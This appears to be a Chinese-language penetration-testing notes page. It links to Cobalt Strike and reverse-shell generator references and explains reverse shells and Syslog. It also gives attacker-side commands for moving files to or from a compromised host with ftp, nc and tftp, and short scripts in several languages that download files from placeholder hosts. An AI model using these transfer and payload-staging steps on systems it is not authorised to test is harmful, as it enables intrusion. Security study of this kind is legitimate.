# 端点安全

- [端点安全](#端点安全)
  - [C2 工具](#c2-工具)
  - [反弹Shell](#反弹shell)
  - [Syslog](#syslog)
  - [下载文件](#下载文件)
    - [系统自带软件/工具下载](#系统自带软件工具下载)
      - [FTP](#ftp)
      - [Netcat](#netcat)
      - [TFTP](#tftp)
    - [编程语言下载脚本](#编程语言下载脚本)
      - [Powershell](#powershell)
      - [Perl](#perl)
      - [Python](#python)
      - [Ruby](#ruby)
      - [PHP](#php)

---

## C2 工具

[Cobalt Strike 模块详解&功能详解 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/261298349)

---

## 反弹Shell

> [Online - Reverse Shell Generator (revshells.com)](https://www.revshells.com/)
>
> [反弹Shell，看这一篇就够了 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/9488?time__1311=n4%2BxuDgD9AdWqhDBqDwmDUok0Kwqq2DiKx&alichlgref=https%3A%2F%2Fwww.google.com%2F)

反弹Shell就是攻击机监听在某个TCP/UDP端口为服务端, 目标机主动发起请求到攻击机监听的端口, 并将其命令行的输入输出转到攻击机

可以在 [Online - Reverse Shell Generator (revshells.com)](https://www.revshells.com/) 获取到各种方式的反弹 Shell 写法

---

## Syslog

> [Syslog - 维基百科，自由的百科全书 (wikipedia.org)](https://zh.wikipedia.org/zh-hans/Syslog)
>
> [关于 syslog 你要知道的一切 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/62793386)

Syslog(System Logging Protocol)是一种用于从各种网络设备以特定格式发送和接收通知消息的标准协议。

这些消息包括时间戳、事件消息、严重性、主机IP地址、诊断等。Syslog可以用于记录设备的日志，监控系统的状态，报告故障或警告，分析网络性能等。

Syslog协议通常用于实现系统监控、故障排除、安全审计以及日志记录和分析。

---

## 下载文件

### 系统自带软件/工具下载

#### FTP

一般情况下攻击者使用 FTP 上传文件需要很多交互的步骤，下面这个 bash 脚本，考虑到了交互的情况，可以直接执行并不会产生交互动作。

```bash
ftp 127.0.0.1
username
password
get file
exit
```

当然根据实际情况也可以进入交互终端：

```bash
ftp 192.168.3.2
输入用户名和密码后
lcd E:\file # 进入E盘下的file目录
cd www # 进入服务器上的www目录
get access.log # 将服务器上的access.log下载到E:\file
```

---

#### Netcat

攻击者的电脑上输入:

```bash
cat file | nc -l 1234
```

> 这个命令会将 file 的内容输出到本地的 1234 端口中，然后不论谁连接此端口，file 的内容将会发送到连接过来的 IP。

目标电脑上的命令:

```bash
nc host_ip 1234 > file
```

这条命令将连接攻击者的电脑, 接受传过来的文件内容并保存到 file 路径

---

#### TFTP

在 Windows Vista 以及以后的版本中默认有 FTP，可以使用以下命令运行：

上传：

```powershell
tftp -i IP地址 PUT C:\%homepath%\file 远程存放位置
```

下载：

```powershell
tftp -i IP地址 GET C:\%homepath%\file 本地存放位置
```


---

### 编程语言下载脚本

#### Powershell

PowerShell 是一种 winodws 原生的脚本语言，对于熟练使用它的人来说，可以实现很多复杂的功能。

下面这两条指令实现了从 Internet 网络下载一个文件。

```Powershell
$p = New-Object System.Net.WebClient
$p.DownloadFile("http://domain/file" "C:\%homepath%\file")
```

> 关于 Windows 上 Powershell 下载与执行在[Windows安全-下载与执行文件-Net.WebClient](Windows/index.md#Net.WebClient) 处有更多

---

#### Perl

编写 Perl 脚本实现文件下载:

```perl
#!perl
#!/usr/bin/perl
use LWP::Simple;
getstore("http://domain/file", "file");
```

执行脚本文件:

```bash
perl test.pl
```

---

#### Python

```python
#!python
#!/usr/bin/python
import urllib2
u = urllib2.urlopen('http://domain/file')
localFile = open('local_file', 'w')
localFile.write(u.read())
localFile.close()
```

---

#### Ruby

Ruby 是一个面对对象的语言，Metasploit 框架就是用它来实现的，当然他也可以实现像下载文件这样的小任务。

```ruby
#!ruby
#!/usr/bin/ruby
require 'net/http'
Net::HTTP.start("www.domain.com") { |http|
r = http.get("/file")
open("save_location", "wb") { |file|
file.write(r.body)
}
}
```

执行脚本:

```bash
ruby test.rb
```

---

#### PHP

PHP 作为一种服务端脚本，也可以实现下载文件这种功能。

```php
#!/usr/bin/php
<?php
        $data = @file("http://example.com/file");
        $lf = "local_file";
        $fh = fopen($lf, 'w');
        fwrite($fh, $data[0]);
        fclose($fh);
?>
```

执行脚本文件:

```bash
php test.php
```

---







